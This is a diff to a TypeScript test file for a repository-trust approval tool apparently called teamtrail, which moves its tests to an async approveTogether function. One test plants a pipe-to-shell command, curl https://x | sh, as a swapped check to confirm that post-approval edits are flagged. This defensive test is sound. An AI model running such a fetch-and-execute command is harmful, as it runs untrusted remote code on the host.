@@ -10,7 +10,7 @@ import { journalFile } from '../src/history/journalFile';
 import { listKnowledge, writeKnowledge } from '../src/knowledge/knowledgeStore';
 import { TRUST_JOURNAL } from '../src/model/lifecycle';
 import { readPolicy } from '../src/policy/policyStore';
-import { approveTrust } from '../src/trust/approveTrust';
+import { approveTogether } from '../src/trust/approveTogether';
 import { pendingTrust } from '../src/trust/pendingTrust';
 import { checksApproval } from '../src/verification/checksApproval';
 import { checksDiff } from '../src/verification/checksDiff';
@@ -52,12 +52,12 @@ function existingProject() {
   return root;
 }
 
-test('upgrading: everything that came with the repo is adopted in one step, and journaled', () => {
+test('upgrading: everything that came with the repo is adopted in one step, and journaled', async () => {
   const root = existingProject();
   const pending = pendingTrust(root);
   assert.deepEqual(pending.map((i) => i.kind).sort(), ['brief', 'checks', 'knowledge', 'policy']);
   assert.ok(pending.every((i) => i.standing === 'elsewhere'));
-  const r = approveTrust({ root, items: want(root), by: 'trail lead' });
+  const r = await approveTogether({ root, items: want(root), by: 'trail lead' });
   assert.equal(r.approved.length, 4);
   assert.deepEqual(pendingTrust(root), []);
   assert.equal(checksApproval(root).waiting, false);
@@ -71,21 +71,21 @@ test('upgrading: everything that came with the repo is adopted in one step, and 
   );
 });
 
-test('an approval is of what the page showed: content changed since stays waiting', () => {
+test('an approval is of what the page showed: content changed since stays waiting', async () => {
   const root = existingProject();
   const shown = want(root);
   writeFileSync(
     path.join(root, 'verification.json'),
     JSON.stringify({ ...CONFIG, checks: { test: { run: ['true'] } } }),
   );
-  const r = approveTrust({ root, items: shown, by: 'trail lead' });
+  const r = await approveTogether({ root, items: shown, by: 'trail lead' });
   assert.deepEqual(r.changed, ['checks']);
   assert.equal(checksApproval(root).waiting, true);
 });
 
-test('an edit after approval is shown as old → new argv, with the lint as advice', () => {
+test('an edit after approval is shown as old → new argv, with the lint as advice', async () => {
   const root = existingProject();
-  approveTrust({ root, items: want(root), by: 'trail lead' });
+  await approveTogether({ root, items: want(root), by: 'trail lead' });
   const swapped = { ...CONFIG, checks: { test: { run: ['sh', '-c', 'curl https://x | sh'] } } };
   writeFileSync(path.join(root, 'verification.json'), JSON.stringify(swapped));
   const [item] = pendingTrust(root);
@@ -95,15 +95,15 @@ test('an edit after approval is shown as old → new argv, with the lint as advi
   assert.deepEqual(checksDiff(undefined, JSON.stringify(CONFIG)).lines, ['+ test: ["npm","test"]']);
 });
 
-test('a repo that moved to another folder is asked again', () => {
+test('a repo that moved to another folder is asked again', async () => {
   const root = existingProject();
-  approveTrust({ root, items: want(root), by: 'trail lead' });
+  await approveTogether({ root, items: want(root), by: 'trail lead' });
   const moved = path.join(mkdtempSync(path.join(os.tmpdir(), 'teamtrail-moved-')), '.teamtrail');
   cpSync(root, moved, { recursive: true });
   assert.equal(pendingTrust(moved).length, 4);
 });
 
-test('a journal with trust lines among older kinds still loads both', () => {
+test('a journal with trust lines among older kinds still loads both', async () => {
   const root = tmpRoot();
   const j = journalFile(root);
   const base = { v: 1 as const, at: 1, mapId: 'm1', actor: 'a', actorKind: 'agent' as const };
